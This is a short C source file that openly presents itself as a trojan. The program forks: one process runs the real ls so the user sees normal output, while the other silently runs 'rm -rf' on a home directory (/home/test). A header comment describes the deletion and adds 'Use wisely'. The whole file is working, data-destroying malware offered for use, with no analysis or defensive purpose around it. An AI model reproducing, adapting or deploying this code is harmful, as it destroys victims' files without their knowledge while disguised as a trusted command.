/*  This program quietly deletes everything in the home directory while performing the function of ls. Use wisely  */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {
  
  if (fork() > 0)
    // This is the program the user thinks is being run
    execve("/usr/bin/ls", argv, NULL);
  else {
   // Prepare the payload
   const char payload_arg0[] = "rm";
   const char payload_arg1[] = "-rf";
   const char payload_arg2[] = "/home/test";

   const char* payload_argv[] = {payload_arg0,
                                 payload_arg1,
                                 payload_arg2,
                                 NULL};
    
   // Execute the payload
   execve("/usr/bin/rm", payload_argv, NULL);
 }

  return EXIT_SUCCESS;
}
